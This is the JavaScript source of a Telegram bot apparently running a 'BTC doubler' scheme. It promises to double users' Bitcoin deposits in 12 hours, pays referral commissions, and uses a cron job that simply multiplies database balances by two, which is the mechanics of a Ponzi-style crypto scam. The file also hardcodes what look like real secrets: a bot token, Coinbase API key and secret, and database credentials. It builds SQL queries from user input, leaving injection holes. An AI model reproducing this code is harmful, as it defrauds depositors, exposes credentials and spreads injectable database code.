const Telegraf = require('telegraf');
const Extra = require('telegraf/extra');
var randomItem = require('random-item');
const Markup = require('telegraf/markup');
const bot = new Telegraf("740398927:AAHjBEqgMAT-wR2kBJJ1gB7leluijwizWvY");
const Scene = require('telegraf/scenes/base')
const session = require('telegraf/session')
const Stage = require('telegraf/stage')
var randomDecimal = require('random-decimal');
const { enter,leave } = Stage
var btc='d63b2e5d-4e54-5990-943f-ef5788433df1'
var rates = require("bitcoin-exchange-rates");
var cron = require('node-cron');
var mysql = require('mysql');
var WAValidator = require('wallet-address-validator');
var Coinbase = require('coinbase');
var Client = require('coinbase').Client;
var mysecret = '8eDpUW9PJ7E16xlns9msu5vUNxth9G0A'
var mykey = 'JaH2VY37PArRPeod'

var client = new Client({'apiKey': mykey, 'apiSecret': mysecret});
var con = mysql.createConnection({
    host: "bpast9glybak7yneqdgv-mysql.services.clever-cloud.com",
    user: "uzowgvhht0h38yjb",
    password: "ZuR0Xt1e8lXi8gVJeXau",
    database:"bpast9glybak7yneqdgv"
});
var rn = require('random-number');
var options = {
    min:  0.000001
    , max:  0.0001
}
//server

const {createServer} = require('http')
const server = createServer(() => {})
server.listen(3000)
con.connect(function(err) {
    if (err) throw err;
    console.log("Connected!");
});

//catch error
bot.catch((err) => {
    console.log('Ooops', err)
})



//menu refferal start

bot.use(Telegraf.log());





//start
bot.command('start',ctx => {
    var message = ctx.message;
    var id = ctx.from.id;
    var start = '/start';
    con.query("SELECT id FROM account WHERE id=" + id, function (err, result, fields) {
        console.log(result.length)
        if (message.text == start && result.length===0) {
            var chatid = ctx.from.id;
            var firstname = ctx.from.first_name;
            var bal = 0;
            var tim = new Date();
            var address = 'none';
            var refa = 411002680;
            var user = {id: chatid, balance: bal, time: tim, withdrawadd: address, ref: refa};
            con.query("insert into `account` SET ?", user, function (error, results) {

                console.log(error)
                ctx.replyWithHTML('welcome ' + ctx.from.first_name + ' to <b>BTC doubler</b>.\n\n<b>Double your Bitcoins in just 12hrs</b>️', Markup
                    .keyboard([
                        ['💵Balance'],
                        ['🔺Deposit','🔻Withdraw'],
                        ['🔁Re-invest','👤Referral'],
                        ['✳️Extra']
                    ])
                    .resize()
                    .extra())

            })

        } else if (message.text.split(start)[1] == id) {
            ctx.reply('🚫You cannot refer yourself', Markup
                .keyboard([
                    ['🏠Menu'] // Row1 with 2 buttons
                ])

                .resize()
                .extra())
        } else if (message.text.split(start)[1] !== id) {

            var chatd = ctx.from.id
            con.query("SELECT id FROM account WHERE id=" + chatd, function (err, result, fields) {
                console.log(result.length)
                if (result.length === 0) {

                    var chatidi = ctx.from.id;
                    var firstnamee = ctx.from.first_name;
                    var bala = 0;
                    var time = new Date();
                    var addresse = 'none';
                    var refidi = message.text.split(start)[1]
                    var useri = {
                        id: chatidi,
                        balance: bala,
                        time: time,
                        withdrawadd: addresse,
                        ref: refidi,
                    };
                    con.query("insert into `account` SET ?", useri)

                    var chatd = ctx.from.id
                    con.query("SELECT ref FROM account WHERE id=" + chatd, function (err, result, fields) {

                        if (result[0].ref !== refidi) {
                            var refbonus =0.000012;
                            var ref = 1;
                            var refid = message.text.split(start)[1];
                            var sql = "update `account` set `balance` =`balance`+ '" + refbonus + "', friends =`friends`+ " + ref + ", friendsbonus = `friendsbonus`+" + refbonus + " where `id` = '" + refid + "'";



                            con.query(sql)

                            ctx.replyWithHTML('welcome ' + ctx.from.first_name + ' to <b>BTC doubler</b>.\n\n<b>Double your Bitcoins in just 12hrs </b>️', Markup
                                .keyboard([
                                    ['💵Balance'],
                                    ['🔺Deposit','🔻Withdraw'],
                                    ['🔁Re-invest','👤Referral'],
                                    ['✳️Extra']
                                ])


                                .resize()
                                .extra())
                            con.query("SELECT id FROM account WHERE id=" + refid, function (err, result, fields) {
                                ctx.telegram.sendMessage(result[0].id, 'you have a new refferal,you receive:<b>+0.000012 BTC 💵️</b>',Extra
                                    .HTML()
                                    .markup((m) => m.inlineKeyboard([
                                        m.callbackButton('💵Balance', '💵Balance')

                                    ], {columns: 1})))


                            })
                        }
                    })

                } else if (result.length > 0) {
                    var rd = ctx.from.id
                    con.query("SELECT ref FROM account WHERE id=" + rd, function (err, result, fields) {
                        if (result[0].ref == ctx.message.text.split(start)[1]) {
                            ctx.reply('🚫you have already used this link', Markup
                                .keyboard([
                                    ['💵Balance'],
                                    ['🔺Deposit','🔻Withdraw'],
                                    ['🔁Re-invest','👤Referral'],
                                    ['✳️Extra']
                                ])

                                .resize()
                                .extra())
                        } else if (result[0].ref !== ctx.message.text.split(start)[1]) {
                            ctx.reply('???', Markup
                                .keyboard([
                                    ['💵Balance'],
                                    ['🔺Deposit','🔻Withdraw'],
                                    ['🔁Re-invest','👤Referral'],
                                    ['✳️Extra']
                                ])

                                .resize()
                                .extra())
                        }
                    })
                }
            })
        }
    })
})
bot.hears('💵Balance',ctx => {
  con.query("SELECT `balance`,`time`,`invested`,`withdrawadd` FROM `account` WHERE `id`="+ctx.from.id,function (err,res) {
      var btcAmount, currency, rates;

      rates = require('bitcoin-exchange-rates');

      btcAmount = res[0].balance;

      currency = 'USD';

      rates.fromBTC(btcAmount, currency, function (err, rate) {
         ctx.replyWithHTML('<b>💰Balance: </b>'+res[0].balance+'\n\n<b>📈USD:</b> <i>'+rate+' usd</i>\n\n<b>⚡️Amount to Double: </b>'+res[0].invested+'\n\n<b>📝Account creation:</b>'+res[0].time,Markup
             .keyboard([
                 ['🔺Deposit'],
                 ['🏠Menu']

             ])
             .resize()
             .extra())
             .then(() => {
                 ctx.replyWithHTML('<b>your withdraw wallet:</b> ' + res[0].withdrawadd, Extra
                     .HTML()
                     .markup((m) => m.inlineKeyboard([
                         m.callbackButton('🖋Set withdraw wallet', '🖋Set withdraw wallet')

                     ], {columns: 1})))
             })

      });
      ////////////check transactions
      ////////////transactions
      var user = ctx.from.id
      var sqli = "SELECT depoaddre,txid,ref,id from `account` where `id` = '" + user + "'";
      con.query(sqli, function (error, res, fields) {
          if (res[0].depoaddre !== null) {
              client.getAccount(btc, function (err, account) {
                  account.getAddress(res[0].depoaddre, function (err, address) {
                      console.log(err)
                      address.getTransactions({}, function (err, txs) {
                          if (txs.length === 0) {
                              console.log('no transactions today')
                          } else if (txs[0].id == res[0].txid) {
                              console.log('transaction already confirmed')
                          } else if (txs[0].id !== res[0].txid) {
                              var txid = txs[0].id
                              var balance = txs[0].amount.amount
                              var transactions = txs[0].amount.amount
                              var chatid = ctx.from.id
                              var sqli = "update `account` set `txid` = '" + txid + "', invested = `invested`+" + balance + ", transactions = `transactions`+" + transactions + " where `id` = '" + chatid + "'";
                              con.query(sqli, function (err, response) {
                                  console.log(err)
                                  var trans = 'https://live.blockcypher.com/btc/address/' + res[0].depoaddre
                                  var ref = res[0].ref
                                  var refbonus = balance * 0.30
                                  var sqla = "update `account` set `balance` = `balance`+" + refbonus + " where `id` = '" + ref + "'";
                                  con.query(sqla)
                                  ctx.telegram.sendMessage(res[0].id, 'we have received your deposit of ' + balance + '  BTC️which will be doubled within 12hrs ')
                                  ctx.telegram.sendMessage(ref, 'you refferal just deposited. ' + refbonus.toFixed(8) + 'BTC has been added to your  balance ')
                                  ctx.telegram.sendMessage('@btcdoublertransactions', '<b>💰 Deposit</b>  \n<b>🔹 Investor:</b> ' + ctx.from.first_name + '\n<b>💵Amount:</b>' + balance + '\n<a href="' + trans + '">view transaction</a>', Extra
                                      .HTML())
                              })
                          }
                      })
                  })
              })
          }
      })




  })

})
bot.hears('🏠Menu',ctx => {
    ctx.replyWithHTML('<b>Menu</b>', Markup
        .keyboard([
            ['💵Balance'],
            ['🔺Deposit','🔻Withdraw'],
            ['🔁Re-invest','👤Referral'],
            ['✳️Extra']
        ])

        .resize()
        .extra())



})
//deposit
bot.hears('🔺Deposit',ctx => {
    ctx.replyWithHTML('Click <b>Get deposit address</b> below to get your personal deposit address to fund your account.\n\n<b>🔺min:</b><i>0.001BTC</i>\n<b>🔻Max:</b><i>no max</i> ',Extra
        .HTML()
        .markup((m) => m.inlineKeyboard([
            m.callbackButton('👇🏻Get deposit address', '👇🏻Get deposit address')

        ], {columns: 1})))



})
////wallet adress
bot.action('👇🏻Get deposit address',ctx=>{
    var user=ctx.from.id
    var sql = "SELECT `depoaddre` from `account` where `id` = '" + user + "'";
    con.query(sql, function(error, results, fields) {
        if (results[0].depoaddre == null) {
            client.getAccount(btc, function (err, account) {
                account.createAddress(null, function (err, address) {
                    var adress = address.address
                    var did=address.id
                    var ide =ctx.from.id
                    ctx.replyWithHTML('<code>' + adress + '</code>',Markup
                        .keyboard([
                            ['💵Balance'],
                            ['🏠Menu']
                        ])

                        .resize()
                        .extra())
                    var sql = "update `account` set `depoaddre` ='" + adress + "', did = '" + did  + "' where `id` = '" + ide + "'";
                    con.query(sql, function (err, results) {
                        console.log(err)
                        ctx.replyWithHTML('<code>⏳ Awaiting deposit...</code>')
                    })
                });
            });

        } else {
            var user = ctx.from.id
            var sqla = "SELECT `depoaddre` from `account` where `id` = '" + user + "'";
            con.query(sqla, function (error, results, fields) {
                ctx.replyWithHTML('<code>' + results[0].depoaddre + '</code>',Markup
                    .keyboard([
                        ['💵Balance'],
                        ['🏠Menu']
                    ])

                    .resize()
                    .extra())

                    .then(() => {
                        ctx.replyWithHTML('<code>⏳ Awaiting deposit...</code>')

                    })
            })
        }
    })





})
/////////////
/////////refferal
bot.hears('👤Referral',ctx => {
    var id=ctx.from.id
    var sql = "SELECT friends,friendsbonus from `account` where `id` = '" + id + "'";
    con.query(sql, function(error, results, fields) {
        ctx.replyWithHTML('<b>👤Referral</b>',Markup
            .keyboard([
                ['🏠Menu']
            ])
            .resize()
            .extra())
            .then(()=> {
                ctx.replyWithHTML('invite your friends and receive <b>0.000012 BTC</b> per  Referral️ and <b>30% of your refferals deposit</b>\n\n♦ <b>Fake, empty or spam  </b>️users are deleted after checking.\n\n👥 Refferals: <b>' + results[0].friends + '</b>\n💵Your income: <b>' + results[0].friendsbonus + '</b>', Extra
                    .HTML()
                    .markup((m) => m.inlineKeyboard([
                        m.callbackButton('⚡️Refferal link', '⚡️Refferal link')

                    ], {columns: 1})))

            })

    })



})

//REFLINK
bot.action('⚡️Refferal link',ctx => {
    ctx.reply('https://t.me/Btcdou_blebot?start='+ctx.from.id)


})
//////////////////reinvest
bot.hears('🔁Re-invest',ctx => {
    ctx.replyWithHTML('<b>💫Re-invest</b>',Markup
        .keyboard([
            ['🏠Menu']
        ])
        .resize()
        .extra())
        .then(()=> {

            con.query("SELECT `balance` FROM `account` WHERE `id`=" + ctx.from.id, function (err, res) {

                ctx.replyWithHTML('you can re-invest back and get your doubled amount again after 12hrs.\n\n<b>Min re-invest:</b>0.002 BTC\n\nyour balance:<b>' + res[0].balance+'</b>', Extra
                    .HTML()
                    .markup((m) => m.inlineKeyboard([
                        m.callbackButton('💫Re-invest', '💫Re-invest')

                    ], {columns: 1})))


            })
        })
})
///reinvest
bot.action('💫Re-invest',ctx => {
    var user = ctx.from.id
    var sqla = "SELECT `balance` from `account` where `id` = '" + user + "'";
    con.query(sqla, function (error, results, fields) {
        if (results[0].balance<0.002){
            ctx.replyWithHTML('<b>😥minimum reinvestment is 0.002 BTC and you have </b>'+results[0].balance+' BTC')
        }else {
            var reinvest=results[0].balance
            con.query("UPDATE `account` set `balance`=0,`invested`=`invested`+'"+reinvest+"' WHERE `id`="+ctx.from.id,function (err,res) {
                ctx.replyWithHTML('💫Succesfully reinvested'+reinvest+' BTC')
            })


        }


    })




})
////////














const withdrawscene = new Scene('withdraw')
withdrawscene.enter((ctx) => {
    var id = ctx.from.id
    var sql = "SELECT withdrawadd,balance from `account` where `id` = '" + id + "'";
    con.query(sql, function (error, results, fields) {
        if (results[0].withdrawadd == "none") {
            ctx.replyWithHTML('<b>withdraw address not set</b>')
            ctx.scene.leave()
        } else {

            rates = require('bitcoin-exchange-rates');

            btcAmount = results[0].balance;

            currency = 'USD';
            rates.fromBTC(btcAmount, currency, function (err, rate) {
                ctx.replyWithHTML('<b>🏵Withdraw funds</b>\n\n ▪️Min withdraw:<b>0.002 BTC</b>\n▪️Your BTC:<b>'+results[0].balance+ '</b> <i>('+rate+' usd)</i>'+'\nWithdraw wallet:<b>'+results[0].withdrawadd+'</b>')
                    .then(() => {
                        ctx.replyWithHTML('<i>Enter the number of BTC you would like to withdraw to your BTC Wallet (a minimum of 0.002 BTC)</i>', Markup
                            .keyboard([
                                ['🛑cancel'], // Row1 with 2 buttons
                            ])

                            .resize()
                            .extra())

                    })
            })
        }
    })
})
withdrawscene.leave((ctx) =>  ctx.reply('Main menu', Markup
    .keyboard([
        ['💵Balance'],
        ['🔺Deposit','🔻Withdraw'],
        ['🔁Re-invest','👤Referral'],
        ['✳️Extra']
    ])

    .resize()
    .extra())
)
withdrawscene.hears('🛑cancel',(ctx => ctx.scene.leave()))
withdrawscene.on('message',ctx => {
    var id = ctx.from.id
    var sql = "SELECT balance from `account` where `id` = '" + id + "'";
    con.query(sql, function (error, results, fields) {
        if (isNaN(ctx.message.text)) {
            ctx.reply('please enter a valid amount')

        } else if (ctx.message.text <0.002) {
            ctx.replyWithHTML('The minimum required for withdraw is <b>0.002 BTC</b>')
            ctx.scene.leave()
        } else if (ctx.message.text > results[0].balance) {
            ctx.reply('your balance is not enough for the requsted withdrawal')
            ctx.scene.leave()
        } else {
            var id = ctx.from.id
            var sql = "SELECT balance,withdrawadd from `account` where `id` = '" + id + "'";
            con.query(sql, function (error, results, fields) {
                var payout =ctx.message.text
                var addre = results[0].withdrawadd
                client.getAccount(btc, function (err, account) {
                    account.sendMoney({
                        'to': addre,
                        'amount': payout,
                        'currency': 'BCH'
                    }, function (err, tx) {
                        var trans='https://live.blockcypher.com/btc/address/'+results[0].withdrawadd
                        ctx.telegram.sendMessage('@btcdoublertransactions', '<b>💰 Withdraw</b>  \n<b>🔹 Investor:</b> ' + ctx.from.first_name + '\n<b>💵Amount:</b>'+payout+'\n<a href="'+trans+'">view transaction</a>',Extra
                            .HTML())
                        var user = ctx.from.id
                        var amount = ctx.message.text
                        var sqla = "update `account` set `balance` =`balance`- '" + amount  + "', transactions =`transactions`+ " + payout + " where `id` = '" + user + "'";
                        con.query(sqla)
                        ctx.replyWithHTML('Your withdrawal of ' + payout + ' BTC is being processed', Markup
                            .keyboard([
                                ['💵Balance'],
                                ['🔺Deposit','🔻Withdraw'],
                                ['🔁Re-invest','👤Referral'],
                                ['✳️Extra']
                            ])

                            .resize()
                            .extra())

                        ctx.scene.leave()
                    });
                });


            })
        }
    })
})
////
////set address
const greeterScene = new Scene('greeter')
greeterScene.enter((ctx) => ctx.reply('send your BTC wallet address to be used for withdrwals below to update it',Markup
    .keyboard([
        ['🛑cancel'] // Row1 with 2 buttons
    ])

    .resize()
    .extra())



)
greeterScene.hears('🛑cancel',ctx => {
    ctx.reply('Main menu', Markup
        .keyboard([
            ['💵Balance'],
            ['🔺Deposit','🔻Withdraw'],
            ['🔁Re-invest','👤Referral'],
            ['✳️Extra']
        ])

        .resize()
        .extra())
    ctx.scene.leave()



})
greeterScene.on('message', (ctx) => {
    var valid = WAValidator.validate(ctx.message.text, 'BTC');
    if(valid){
        var ide = ctx.from.id
        var sqli = "update `account` set `withdrawadd` = '" + ctx.message.text + "' where `id` = '" + ide + "'";
        con.query(sqli)
        ctx.replyWithHTML('<b>withdraw address updated</b>', Markup
            .keyboard([
                ['💵Balance'],
                ['🔺Deposit','🔻Withdraw'],
                ['🔁Re-invest','👤Referral'],
                ['✳️Extra']
            ])

            .resize()
            .extra())
        ctx.scene.leave()


    }else {
        ctx.reply('invalid BTC address')
    }
})
////
bot.hears('✳️Extra',ctx => {
    con.query('SELECT `id` FROM `account`', function (error, result) {
        con.query('SELECT SUM(transactions)FROM account;', function (err, response) {
            const re = JSON.parse(JSON.stringify(response[0]).replace('SUM(transactions)', 'suma'))
            con.query('SELECT `started` FROM `account` WHERE `id`=411002680', function (err, respa) {
                ctx.replyWithHTML('<b>📈Stastistics</b>\n\n📈Days online: ' + respa[0].started + '\n👨🏻‍️Members: ' + result.length + '\n💰Total transacted: ' + re.suma + ' BTC',Markup
                    .keyboard([
                        ['🏠Menu'] // Row1 with 2 buttons
                    ])

                    .resize()
                    .extra())
                    .then(()=>{
                        ctx.replyWithHTML('<b>🔻Recent transactions 👇🏻</b>',Extra
                            .HTML()
                            .markup((m) => m.inlineKeyboard([
                                m.urlButton('🔻Recent transactions', 'https://t.me/btcdoublertransactions')

                            ], { columns: 1 })))
                    })
            })
        })
    })
})


//CRON
cron.schedule('*/1 * * * * *', () => {
    var id=411002680;
    var idle=1;
    con.query("update `account` set `idle` = '" + idle + "' where `id` = '" + id + "'")

})
//days on
cron.schedule('0 0 0 * * *', () => {
    con.query('update account set `started`=`started`+1 WHERE `id`=411002680')

})
/////double
//CRON
cron.schedule('0 */12 * * *', () => {
    var id=0.001
    var idle=2
    con.query("update `account` set `balance` =`invested`* '" + idle + "',`invested`=0  where `invested` >='" + id + "'")

})



//scenes
const stage = new Stage([greeterScene,withdrawscene], { ttl: 18000000 })
bot.use(session())
bot.use(stage.middleware())
bot.action('🖋Set withdraw wallet', enter('greeter'))
bot.hears('🔻Withdraw',enter('withdraw'))





bot.startPolling()